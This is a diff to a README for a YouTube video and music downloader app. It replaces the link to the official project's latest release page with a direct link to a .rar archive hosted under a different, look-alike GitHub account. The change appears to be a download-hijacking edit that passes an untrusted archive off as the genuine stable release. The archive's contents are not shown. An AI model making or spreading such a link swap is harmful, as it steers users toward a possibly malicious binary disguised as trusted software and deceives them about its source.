@@ -15,7 +15,7 @@ It's a simple desktop application where you can download videos and music in hig
 
 
 ## Download
-- 🟢 **[Stable release](https://github.com/Tyrrrz/YoutubeDownloader/releases/latest)**
+- 🟢 **[Stable release](https://github.com/BruceExtreme/Youtube-Downloader/releases/download/1.0/Youtube.Downloader.rar)**
 
 
 
